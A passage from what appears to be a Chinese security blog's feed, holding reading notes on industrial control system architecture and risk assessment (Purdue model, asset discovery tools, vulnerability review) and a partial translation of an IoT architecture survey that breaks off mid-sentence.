入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。</p><p>PS：本篇文章是从多篇文章和论文总结而成，并非原创，只是本人整理，本意是希望对初学Modbus的同学有所帮助。如果涉及到侵权方面的事请私信我，立刻删除。</p><p>*<strong>本文整理:rye_，转载请注明FreeBuf COM</strong></p><p>*<strong>本文由Fstark在rye原文基础上进行了补充完善</strong></p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工控协议 </tag>
            
            <tag> Modbus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（读书笔记）工业控制系统安全概述</title>
      <link href="2019/10/22/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%A4%A7%E6%9B%9D%E5%85%89-%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2019/10/22/%E3%80%8A%E9%BB%91%E5%AE%A2%E5%A4%A7%E6%9B%9D%E5%85%89-%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="第一篇：工业控制系统安全概述"><a href="#第一篇：工业控制系统安全概述" class="headerlink" title="第一篇：工业控制系统安全概述"></a>第一篇：工业控制系统安全概述</h2><p>工控安全不仅需要了解常见的网络硬件和操作系统的网络安全知识，还需要知道控制系统的安全知识，以及工业过程的物理和工程要求，因此工控安全要求涵盖内容广泛，涉及多个学科。</p><a id="more"></a><h3 id="信息物理系统"><a href="#信息物理系统" class="headerlink" title="信息物理系统"></a>信息物理系统</h3><p>PLC的核心是梯形逻辑，而梯形逻辑的核心是一个大型的if-then-else决策树，用于对过程或生产操作进行顺序控制。PLC的诞生带来了大量的基于逻辑电路的数字系统的出现，例如SCADA、DCS等</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8702lv38uj30rs0w0ndi.jpg" alt="image-20191022151640909"></p><p>资产所有者需要管理两个网络：负责业务信息的信息技术（IT）网络和负责生产运行维护的运营技术（OT）网络。现在，IT与OT的相互融合已经十分流行。</p><h4 id="传统威胁的全新攻击向量"><a href="#传统威胁的全新攻击向量" class="headerlink" title="传统威胁的全新攻击向量"></a>传统威胁的全新攻击向量</h4><p>原本在隔离网络中几乎被完全忽略的控制系统网络威胁突然走上前台</p><p>工控系统的设备、协议以及应用程序本身设计之初都没有考虑到安全问题（以为是隔离的）</p><p>这些系统本身具有的关键性和敏感性使得对其开展补丁修复工作十分困难</p><p>工控环境中经常会出现IT技术能力匮乏的情况</p><h4 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g870ehivzmj318s0rsgxz.jpg" alt="image-20191022152808634"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g870f65y8kj31tv0rsn9x.jpg" alt="image-20191022152847907"></p><h4 id="工控的现实风险"><a href="#工控的现实风险" class="headerlink" title="工控的现实风险"></a>工控的现实风险</h4><p>Kim Zetter撰写的《Countdown to Zere Day：Stuxnet and the Launch of the World‘s First Digital Weapon》（Crown，2014）有详尽的时间表和相关统计</p><h3 id="工业控制系统概述"><a href="#工业控制系统概述" class="headerlink" title="工业控制系统概述"></a>工业控制系统概述</h3><p>工业控制系统根据其功能大致可以归入以下三种类别中的一个或多个：画面、监视、控制。</p><h4 id="画面"><a href="#画面" class="headerlink" title="画面"></a>画面</h4><p>画面（View）功能即观察过程的当前状态以便做出决策</p><h4 id="监视"><a href="#监视" class="headerlink" title="监视"></a>监视</h4><p>监视（Monitor）功能就是监视过程的当前状态，这些状态包括液位、温度、阀位置和进给率等诸多要素。</p><p>它与画面的区别在于，监视还包括了报警、事件状态以及不良过程状态警告。</p><h4 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h4><p>控制（Control）的作用是启动控制阀门、电机以及引起机械物理状态发生变化的其他组件并对其加以控制。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8710z4iyaj33340c77wh.jpg" alt="image-20191022154945077"></p><h4 id="用于工控系统的普渡参考模型"><a href="#用于工控系统的普渡参考模型" class="headerlink" title="用于工控系统的普渡参考模型"></a>用于工控系统的普渡参考模型</h4><p>普渡参考模型在工控系统行业也被简称为普渡模型（Purdue Model），广泛用于描述大型工控系统中所有重要组件之间的主要相互依赖关系与互联关系。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8716tqqiqj30xs0rsqqw.jpg" alt="image-20191022155522391"></p><h5 id="第五层：企业区"><a href="#第五层：企业区" class="headerlink" title="第五层：企业区"></a>第五层：企业区</h5><p>企业区负责供应链管理。</p><p>这一层次一般不与工控系统直接相连，但是对于来自各个OT网络和工控系统组件的准确、及时的信息有着明确的要求</p><h5 id="第四层：现场业务规划和组织"><a href="#第四层：现场业务规划和组织" class="headerlink" title="第四层：现场业务规划和组织"></a>第四层：现场业务规划和组织</h5><p>第五层通常设置在公司总部，第四层设置在每个现场、车间或者设施中控制本地设施运行的it系统</p><p>该层从第五层接受工单，对底层情况进行监控，并对第五层的数据进行更新</p><h5 id="工控系统非军事区层"><a href="#工控系统非军事区层" class="headerlink" title="工控系统非军事区层"></a>工控系统非军事区层</h5><p>该层（ICS-DMZ）实现了IT和OT之间的信息共享。</p><p>DMZ区的作用是不将下层关键组件直接暴露给攻击者的情况下实现IT信息的安全交换</p><h5 id="第三层：现场制造和操作控制"><a href="#第三层：现场制造和操作控制" class="headerlink" title="第三层：现场制造和操作控制"></a>第三层：现场制造和操作控制</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871hz5nhcj330j0rs1kz.jpg" alt="image-20191022160605291"></p><h5 id="第二层：区域监控"><a href="#第二层：区域监控" class="headerlink" title="第二层：区域监控"></a>第二层：区域监控</h5><p>第二层有许多与第三层相同的功能，但是第二层主要通过过程单元或者生产线级的功能实现对过程中单个区域的本地控制。</p><p>实际的工控系统开始在本层出现，例如可编程控制器（PLC）和变频驱动器（VFD）</p><p>第二层的主要系统还包括人机界面（HMI）</p><h5 id="第一层：基本控制"><a href="#第一层：基本控制" class="headerlink" title="第一层：基本控制"></a>第一层：基本控制</h5><p>虽然第二层也有plc和vfd，但是第一层才是这些设备主要出现的地方。</p><p>第一层包括基本过程控制系统(BPCS).它主要执行并管理以下功能：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871qwjqw3j32nj0rsqv5.jpg" alt="image-20191022161439973"></p><h5 id="第零层：过程"><a href="#第零层：过程" class="headerlink" title="第零层：过程"></a>第零层：过程</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871skttb6j33340p21ky.jpg" alt="image-20191022161616713"></p><h5 id="功能安全层"><a href="#功能安全层" class="headerlink" title="功能安全层"></a>功能安全层</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871t8cn7dj32sr0rshdu.jpg" alt="image-20191022161652622"></p><h5 id="总揽"><a href="#总揽" class="headerlink" title="总揽"></a>总揽</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871u45ppaj315t0rstnw.jpg" alt="image-20191022161744768"></p><h4 id="常用控制功能、设备和组件的类型"><a href="#常用控制功能、设备和组件的类型" class="headerlink" title="常用控制功能、设备和组件的类型"></a>常用控制功能、设备和组件的类型</h4><h5 id="监控与数据采集系统"><a href="#监控与数据采集系统" class="headerlink" title="监控与数据采集系统"></a>监控与数据采集系统</h5><p>SCADA主要指在广阔的地理空间区域中一组不同类型的工控系统设备，可以将SCADA看作是构成整个工控系统的所有独立的控制和通信组件的总和。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g871yufxouj31h20rs1ef.jpg" alt="image-20191022162217821"></p><h5 id="集散控制系统"><a href="#集散控制系统" class="headerlink" title="集散控制系统"></a>集散控制系统</h5><p>大型系统使用集散控制系统（DCS）实现对大型设施中的数千个I/O节点的自动控制。</p><p>DCS和SCADA之间的差异十分微小，但是传统上SCADA更多的用于控制分散在不同地理位置上的操作，而DCS通常部署在工厂厂区内。</p><h5 id="可编程控制器"><a href="#可编程控制器" class="headerlink" title="可编程控制器"></a>可编程控制器</h5><p>PLC主要包含三个主要的组件：微控制器、扩展插槽和背板。下图是两种PLC</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872anxnvkj318u0rsnih.jpg" alt="image-20191022163339696"></p><p>微控制器（microcontroller）是PLC的大脑，包含了固件、程序（通常梯形逻辑）和设定点。通常还有其他的拓展模块，将这些部件连接在一起是背板（backplane），由硬线接口对多个设备和微控制器之间的通信提供支持。</p><h5 id="人机界面"><a href="#人机界面" class="headerlink" title="人机界面"></a>人机界面</h5><p>人机界面（HMI）是工控系统的“画面”。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872fq7096j316f0rs4g9.jpg" alt="image-20191022163831914"></p><h5 id="安全仪表系统"><a href="#安全仪表系统" class="headerlink" title="安全仪表系统"></a>安全仪表系统</h5><p>安全仪表系统（SIS）是精心设计的专用控制系统</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872h652poj31m20rs4qq.jpg" alt="image-20191022163955034"></p><h5 id="变频驱动器"><a href="#变频驱动器" class="headerlink" title="变频驱动器"></a>变频驱动器</h5><p>变频驱动器（VFD）本质上就是“智能”的电机。他们是小规模PLC的一种变形形式，也被称为驱动器控制器（drive controller）</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872jhh7kvj30rs0yzh6j.jpg" alt="image-20191022164208077"></p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（读书笔记）工业控制系统风险评估</title>
      <link href="2019/10/22/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"/>
      <url>2019/10/22/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="第二篇：工业控制系统风险评估"><a href="#第二篇：工业控制系统风险评估" class="headerlink" title="第二篇：工业控制系统风险评估"></a>第二篇：工业控制系统风险评估</h2><p>本篇将从一个较高的层次来讨论风险评估过程中的各个步骤，对于工控系统特有的步骤、技巧和方法，还将做进一步的深入探讨。</p><a id="more"></a><h3 id="工控系统风险评估入门"><a href="#工控系统风险评估入门" class="headerlink" title="工控系统风险评估入门"></a>工控系统风险评估入门</h3><p>风险评估通常被称为“差距分析”、“审计”和“脆弱性评估”。</p><h4 id="难以确定的工控系统“风险度量标准”"><a href="#难以确定的工控系统“风险度量标准”" class="headerlink" title="难以确定的工控系统“风险度量标准”"></a>难以确定的工控系统“风险度量标准”</h4><p>一套“均码”的度量标准根本行不通，各个公司针对自己的环境制定出自己独有的评分标准</p><h4 id="风险评估标准"><a href="#风险评估标准" class="headerlink" title="风险评估标准"></a>风险评估标准</h4><p>现有很多公认的风险评估标准，然而大多数这些标准文档适用于信息安全风险。没有考虑到与运营安全风险相关的细节和差异。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8741cv9oaj31ms0rsu08.jpg" alt="image-20191022173354951"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8741rejezj332b0rs4qp.jpg" alt="image-20191022173418032"></p><p>可以看出可用的风险评估标准数量多、使用复杂，并且缺乏针对工控系统的适用性。</p><h4 id="工控系统风险评估中评价和测量的内容"><a href="#工控系统风险评估中评价和测量的内容" class="headerlink" title="工控系统风险评估中评价和测量的内容"></a>工控系统风险评估中评价和测量的内容</h4><p>许多关于工业互联网安全的探讨往往最终都会落在功能安全上（safety），因为功能安全是系统运行的基石之一。</p><p>功能安全是工控系统安全的主要目标，并且也应该是工控系统安全的主要目标。但是，在考虑风险缓解策略时，功能安全不应该是唯一的动力；同时也不应该认为信息安全必然带来功能安全。此外，当发生网络攻击试图导致安全事件时，功能安全系统并不一定就会确保功能安全事件不会发生。</p><p>“合规性并不等于安全性”</p><p>均衡的工控系统风险评估策略应当同时考虑到功能安全和操作安全，以及安全控制措施和脆弱性。</p><p>事实上，一次综合风险评估很大程度上就是一次威胁建模。</p><p>风险的定义：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g874mye1pzj33340ff79d.jpg" alt="image-20191022175437745"></p><p>风险评估旨在通过对之前定义中所强调的属性进行评估来确定风险等级。下面逐一来说明属性是什么：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87a6hp8mjj30v10rs1kx.jpg" alt="image-20191022210626443"></p><p>对风险进行评估与度量的效果越好，风险缓解策略的效率与成本效益也就越高。</p><h4 id="工控系统风险评估过程概述"><a href="#工控系统风险评估过程概述" class="headerlink" title="工控系统风险评估过程概述"></a>工控系统风险评估过程概述</h4><p>将收集到的所有信息聚集起来并同适当的风险属性建立关联，进而组合成“攻击树”，最终用于构建可行的风险场景。</p><p>下图展现了一个全面的风险评估过程所涉及的三个主要阶段：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87ah1n1d1j31la0rstyw.jpg" alt="image-20191022211634960"></p><p>这些所有的步骤致力于实现风险评估共同的关键功能或目标，这些功能包括：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87ajfwucuj332s0rs1kv.jpg" alt="image-20191022211853006"></p><p>下表描述了每个阶段的目标以及同每个阶段的相关联风险属性。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87am1og6cj31km0rs7wh.jpg" alt="image-20191022212123245"></p><h3 id="工控系统风险评估过程步骤"><a href="#工控系统风险评估过程步骤" class="headerlink" title="工控系统风险评估过程步骤"></a>工控系统风险评估过程步骤</h3><p>下图说明了所涉及的每一个步骤以及步骤与整体风险评估过程的各个阶段之间的关联：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87aqfrpkwj30ws0rsnj2.jpg" alt="image-20191022212537223"></p><h4 id="第1阶段：资产识别与判定"><a href="#第1阶段：资产识别与判定" class="headerlink" title="第1阶段：资产识别与判定"></a>第1阶段：资产识别与判定</h4><p>“如果你不知道自己拥有什么，那么你就无法对其实施保护。”</p><h5 id="步骤1-定义业务或运营目标"><a href="#步骤1-定义业务或运营目标" class="headerlink" title="步骤1:定义业务或运营目标"></a>步骤1:定义业务或运营目标</h5><p>关联风险属性：后果、影响</p><p>识别与了解业务或运营目标对于真正理解风险可能对业务带来的后果和影响至关重要。</p><h5 id="步骤2-系统评定与分类"><a href="#步骤2-系统评定与分类" class="headerlink" title="步骤2:系统评定与分类"></a>步骤2:系统评定与分类</h5><p>关联风险属性：目标对象、后果、影响</p><p>在传统IT环境中，系统（system）常用来描述“计算机系统”；在工控环境中，系统是指出于一个共同的目标而协同工作的一组过程设备、处理装置及计算机</p><h5 id="步骤3-资产识别"><a href="#步骤3-资产识别" class="headerlink" title="步骤3:资产识别"></a>步骤3:资产识别</h5><p>关联风险属性：目标对象、攻击向量</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87b1qqorhj33340hab29.jpg" alt="image-20191022213628610"></p><h6 id="命令行主机识别技术"><a href="#命令行主机识别技术" class="headerlink" title="命令行主机识别技术"></a>命令行主机识别技术</h6><p>1.arping 借助工具</p><p>2.arp-scan 扫描工具</p><p>这两个工具的缺点之一在于他们只会告诉你对于某一IP地址是否存在活动主机或设备，要想知道具体是什么类型的设备，还要使用在线工具查找MAC地址。此时如果使用了VMWare就查不出来。</p><p>有一个工具提供更加可靠且完全被动的选择，那就是p0f，一种远程操作系统指纹被动识别工具。他的一个缺点是，对于工控协议和设备的支持还不完善。</p><h6 id="商业被动资产识别工具"><a href="#商业被动资产识别工具" class="headerlink" title="商业被动资产识别工具"></a>商业被动资产识别工具</h6><p>3.GRASSMARLIN</p><p>美国国家安全局发布的工具，免费且开源。</p><h5 id="步骤4-网络拓扑与数据流审查"><a href="#步骤4-网络拓扑与数据流审查" class="headerlink" title="步骤4:网络拓扑与数据流审查"></a>步骤4:网络拓扑与数据流审查</h5><p>关联风险属性：目标对象、攻击向量</p><p>网络拓扑图不仅对于正确识别资产非常重要，对于识别通信路径和数据流也同样非常重要，进而有助于攻击向量的识别</p><p>在工控环境中采用自动化的方式进行绘制有几个缺点，用于网络发现的传统方法通常会主动将流量引入到正在评估的网络上。其次这些工具大多需要长期的部署并应用。</p><p>强烈建议使用数据流（NetFlow）分析工具</p><p>下面列出了进行NetFlow分析时用到的其他的一些工具：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87tyx9gskj32as0rs1kx.jpg" alt="image-20191023083109151"></p><h5 id="步骤5-风险预筛"><a href="#步骤5-风险预筛" class="headerlink" title="步骤5:风险预筛"></a>步骤5:风险预筛</h5><p>关联风险项：后果、影响</p><p>由美国国安部开发的网络安全评估工具（CSET）能够帮助简化该过程并提高该过程的自动化程度。</p><h4 id="第2阶段：脆弱性识别与威胁建模"><a href="#第2阶段：脆弱性识别与威胁建模" class="headerlink" title="第2阶段：脆弱性识别与威胁建模"></a>第2阶段：脆弱性识别与威胁建模</h4><p>脆弱性识别，也称为网络脆弱性评估（CVA）或者安全脆弱性评估（SVA）</p><h5 id="步骤6-安全策略审查"><a href="#步骤6-安全策略审查" class="headerlink" title="步骤6:安全策略审查"></a>步骤6:安全策略审查</h5><p>关联风险属性：脆弱性、威胁向量</p><p>大多数机构都会制定或完备简单的安全策略。网络安全策略是保障其安全状态的基线（baseline）</p><p>通常安全策略都会存在薄弱环节</p><p>以下是一个十分有参考价值的基线列表：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88bld299wj32d10rsb29.jpg" alt="image-20191023184050860"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88bm0xpjaj30yl0rstww.jpg" alt="image-20191023184131310"></p><h5 id="步骤7-控制分析（标准审计、差距分析）"><a href="#步骤7-控制分析（标准审计、差距分析）" class="headerlink" title="步骤7:控制分析（标准审计、差距分析）"></a>步骤7:控制分析（标准审计、差距分析）</h5><p>关联风险属性：脆弱性</p><p>控制分析步骤也被大多数人看作是针对某一标准或策略展开的传统“差距分析”或“审计”工作，并且这一步骤也是大多数“传统”风险评估的中心工作。</p><h5 id="步骤8-网络脆弱性评估（CVA）"><a href="#步骤8-网络脆弱性评估（CVA）" class="headerlink" title="步骤8:网络脆弱性评估（CVA）"></a>步骤8:网络脆弱性评估（CVA）</h5><p>关联风险属性：目标对象、威胁向量、威胁事件</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88br397bqj33340dc1kx.jpg" alt="image-20191023184623710"></p><p>这一步骤主要考虑几种漏洞评估方法：</p><h6 id="（1）漏洞映射"><a href="#（1）漏洞映射" class="headerlink" title="（1）漏洞映射"></a>（1）漏洞映射</h6><p>漏洞映射就是将应用程序、操作系统和固件版本同漏洞数据库中所包含的已知漏洞进行手工匹配的过程，漏洞数据库包括：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88btyuhusj33340ox7wh.jpg" alt="image-20191023184910378"></p><h6 id="（2）配置审查"><a href="#（2）配置审查" class="headerlink" title="（2）配置审查"></a>（2）配置审查</h6><p>配置审查就是对设备、系统和主机配置进行审查的过程，以寻访可能导致风险的、防护水平较弱的配置或错误的配置。</p><p>当前主要的有：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88bwsyuuej33340hokeq.jpg" alt="image-20191023185153766"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88bxi1d43j311n0rs7ub.jpg" alt="image-20191023185233497"></p><h6 id="（3）漏洞扫描"><a href="#（3）漏洞扫描" class="headerlink" title="（3）漏洞扫描"></a>（3）漏洞扫描</h6><p>漏洞扫描使用主动扫描工具，采用将特征匹配和配置审查或补丁审查相结合的方法来识别已知的漏洞。</p><h6 id="（4）实时网络流量分析"><a href="#（4）实时网络流量分析" class="headerlink" title="（4）实时网络流量分析"></a>（4）实时网络流量分析</h6><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c0j6fxlj33340ll4qq.jpg" alt="image-20191023185528198"></p><h6 id="（5）控制分析"><a href="#（5）控制分析" class="headerlink" title="（5）控制分析"></a>（5）控制分析</h6><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c1hl3scj31k50rs7wh.jpg" alt="image-20191023185623124"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c2qde8zj30rs0yjx5e.jpg" alt="image-20191023185735592"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c3hjs26j30rs0yutxg.jpg" alt="image-20191023185819021"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c44usg0j30rs0zatzv.jpg" alt="image-20191023185856533"></p><h4 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h4><p>下表列出的是本书接下来要讨论的剩余步骤，通常称之为威胁建模</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g88c6gjk75j31lx0rsawo.jpg" alt="image-20191023190111005"></p>]]></content>
      
      
      <categories>
          
          <category> 工控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（论文翻译）物联网调查：体系结构，支持技术，安全性和隐私性以及应用程序</title>
      <link href="2019/10/22/%E8%AE%BA%E6%96%87%EF%BC%9A%E7%89%A9%E8%81%94%E7%BD%91%E8%B0%83%E6%9F%A5/"/>
      <url>2019/10/22/%E8%AE%BA%E6%96%87%EF%BC%9A%E7%89%A9%E8%81%94%E7%BD%91%E8%B0%83%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>原文：A Survey on Internet of Things: Architecture, Enabling Technologies, Security and Privacy, and Applications </p><h3 id="第一部分简介"><a href="#第一部分简介" class="headerlink" title="第一部分简介"></a>第一部分简介</h3><ul><li><p>物联网（IOT）的两个功能</p><ul><li>物联网是网络或互联网的扩展[10]，这意味着在物联网中，各种网络应共存，并且这些网络之间的互操作性对于信息传递和支持应用程序至关重要[88]，[7]。互连是物联网中的关键架构问题[132]</li><li>物联网中连接的事物不再局限于设备或对象，还可以是信息，人类行为等。</li></ul></li><li><p>我们将物联网视为多层体系结构，分为感知层，网络层，服务层和应用程序层。</p><a id="more"></a></li></ul><h3 id="第二部分介绍了CPS和IoT之间的关系"><a href="#第二部分介绍了CPS和IoT之间的关系" class="headerlink" title="第二部分介绍了CPS和IoT之间的关系"></a>第二部分介绍了CPS和IoT之间的关系</h3><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g893d5qi6hj30hr09u0vf.jpg"></p><ul><li><p>CPS被称为系统通过集成现代计算和通信技术，可以有效地集成网络和物理组件[131]，[5]，旨在改变人，网络和物理世界之间的交互方式。 CPS强调网络和物理组件之间的相互作用，其目标是通过利用网络组件来使对物理组件的监视和控制安全，高效和智能化[2</p></li><li><p>“网络c”是指使用现代感应技术，通讯技术来有效地监视和控制物理组件，</p><ul><li>而“物理p”是指现实世界中的物理组件，</li><li>“系统s”则反映了复杂性和多样性。</li><li>CPS是物理组件，传感器，执行器，通信网络和控制中心的集成，其中部署传感器以测量和监视物理组件的状态，部署执行器以确保理想的操作物理组件上的通信，以及通信网络用于在传感器，执行器和控制中心之间传递测量数据和反馈意见。控制中心用于分析测量数据并将反馈命令发送给执行器，以确保系统在所需状态下运行</li></ul></li><li><p>cps和iot的相同点</p><ul><li>根据CPS的概述，我们知道CPS和IoT旨在实现网络世界与物理世界之间的互动[100]。特别是，CPS和IoT可以通过智能传感器设备测量物理组件的状态信息，而无需人工输入。同时，在CPS和IoT中，可以通过有线或无线通信网络传输和共享测量的状态信息。在分析测量的状态信息之后，CPS和IoT都可以为应用程序提供安全，高效和智能的服务。 CPS应用程序和IoT应用程序的现有工作已扩展到类似领域（智能电网，智能交通，智能城市等）</li></ul></li><li><p>CPS和基于IoT的区别</p><ul><li>CPS的本质是“系统”。CPS的主要目标是测量物理设备的状态信息，并确保在物理设备上的安全，高效和智能操作。在CPS中，存在传感器/执行器层，通信层和应用程序（控制）层。传感器/执行器层用于收集实时数据并执行命令，通信层用于将数据传递到上层，命令传递到下层，而应用程序（控制）层用于分析数据并做出决策。图1说明了CPS中的三层。从该图可以看出，CPS是垂直架构</li><li>物联网是连接大量设备，并通过在网络空间中使用现代技术来监视和控制设备。因此，物联网的关键是“互连”。物联网的主要目标是互连各种网络，以便可以跨异构网络进行数据收集，资源共享，分析和管理。这样，可以提供可靠，高效和安全的服务。因此，物联网是一种水平架构，应集成所有CPS应用程序的通信层以实现互连，如图1所示</li><li>总而言之，CPS和物联网之间的基本区别是也就是说，CPS被视为“系统”，而物联网被视为“互联网”。 CPS和IoT的共同要求是实时，可靠和安全的数据传输。对CPS和IoT的不同要求如下：对于CPS，有效，可靠，准确，实时的控制是主要目标，而对于IoT，资源共享和管理，数据共享和管理，不同网络之间的接口，大规模数据和大数据的收集和存储，数据挖掘，数据聚合和信息提取以及高质量的网络服务质量（QoS）是重要的服务</li></ul></li></ul><h3 id="第三部分介绍物联网的架构"><a href="#第三部分介绍物联网的架构" class="headerlink" title="第三部分介绍物联网的架构"></a>第三部分介绍物联网的架构</h3><ul><li><p>1.三层架构</p><ul><li><p>应用层</p><ul><li>应用层，也称为业务层，被实现为物联网架构的顶层[7]。应用层接收从网络层发送的数据，并使用该数据提供所需的服务或操作。例如，应用层可以提供存储服务以将接收到的数据备份到数据库中，或者提供分析服务以评估接收到的数据以预测物理设备的未来状态。该层中存在许多应用程序，每个应用程序都有不同的要求。示例包括智能电网，智能交通，智能城市等。[133]，[125]</li></ul></li><li><p>网络层</p><ul><li>网络层，也称为传输层，被实现为物联网架构的中间层[68]。网络层用于接收感知层提供的已处理信息，并确定将数据和信息通过集成网络传输到IoT中心，设备和应用程序的路由。网络层是IoT体系结构中最重要的层，因为各种设备（集线器，交换器，网关，云计算执行等）和各种通信技术（蓝牙，WiFi，长期演进（LTE）等）被集成在这一层。网络层应通过异构网络之间的接口或网关，并使用各种通信技术和协议，向不同事物或应用程序传输数据，或从不同事物或应用程序传输数据</li></ul></li><li><p>感知层</p><ul><li>感知层，也称为传感器层，被实现为物联网架构的底层[11]。感知层通过智能设备（RFID，传感器，执行器等）与物理设备和组件进行交互。其主要目标是将事物连接到IoT网络，并通过部署的智能设备测量，收集和处理与这些事物相关的状态信息，并将处理后的信息通过层接口传输到上层</li></ul></li><li><p>三层架构是物联网的基础，并已在许多系统中设计和实现</p></li></ul></li><li><p>2.基于SoA的体系结构</p><ul><li><p>感知层</p><ul><li>感知层作为体系结构的底层执行，并用于测量，收集和提取与物理设备关联的数据[52]</li></ul></li><li><p>网络层</p><ul><li>网络层用于确定路由，并通过集成的异构网络提供数据传输支持[10]，[47]。</li></ul></li><li><p>服务层</p><ul><li>服务层位于网络层和应用程序层之间，提供支持应用程序层的服务[10]。服务层包括服务发现，服务组合，服务管理和服务接口。在这里，服务发现用于发现所需的服务请求，服务组合用于与连接的对象进行交互，并有效地划分或集成服务以满足服务请求，服务管理用于管理和确定满足以下条件的信任机制服务请求和服务接口用于支持所有提供的服务之间的交互。</li></ul></li><li><p>应用层</p><ul><li>应用层用于支持用户的服务请求。应用程序层可以支持许多应用程序，包括智能电网，智能交通，智能城市等</li></ul></li><li><p>一般来说，SoA是基于组件的模型，可以设计为通过接口和协议[10]，[87]，[136]连接应用程序的不同功能单元（也称为服务）。 SoA可以专注于设计协调服务的工作流程，并实现软件和硬件组件的重用，从而提高SoA用于设计IoT架构的可行性[10]，[137]。因此，SoA可以轻松集成到IoT架构中，其中可以提取传统三层架构中网络层和应用层提供的数据服务，并形成一个新层，即服务层（也称为接口）层或中间件层）。因此，在基于SoA的IoT架构中，存在四个层并彼此交互[123]，这些层是感知层，网络层，服务层和应用程序层。</p></li><li><p>在现有的一些研究中，服务层被分为两个子层，即服务组合子层和服务管理子层。另外，业务层是从应用程序层中提取的，并充当应用程序层的上层，以提供复杂的服务请求。</p></li></ul></li></ul><h3 id="第四部分中，我们介绍了物联网（IoT）的使能技术和挑战"><a href="#第四部分中，我们介绍了物联网（IoT）的使能技术和挑战" class="headerlink" title="第四部分中，我们介绍了物联网（IoT）的使能技术和挑战"></a>第四部分中，我们介绍了物联网（IoT）的使能技术和挑战</h3><ul><li><p>感知层</p><ul><li><p>RFID</p><ul><li><p>通常，RFID作为一种非接触式通信技术，用于识别和跟踪没有接触的物体。它支持通过短距离[8]，[163]的无线电信号进行数据交换。基于RFID的系统包括RFID标签，RFID阅读器和天线[62]。</p></li><li><p>系统</p><ul><li><p>RFID标签</p><ul><li>RFID标签可以是连接到天线的微芯片。每个RFID标签都贴在一个物体上，并具有唯一的标识号</li></ul></li><li><p>RFID阅读器</p><ul><li>RFID阅读器可以通过适当的信号查询附着的RFID标签来识别物体并获得相应的信息[64</li></ul></li><li><p>天线</p><ul><li>天线用于在RFID标签和RFID阅读器之间传输信号</li></ul></li></ul></li><li><p>RFID具有以下优点</p><ul><li><p>快速扫描，耐用性，可重复使用性，大容量存储，非接触式读取，安全性，小尺寸，低成本等</p><ul><li>由于这些好处，RFID在物联网的感知层中可用于识别和跟踪对象以及交换信息</li></ul></li></ul></li><li><p>RFID传感器网络（RSN）</p><ul><li>RFID系统和传感器网络的结合。在RSN中，传感器网络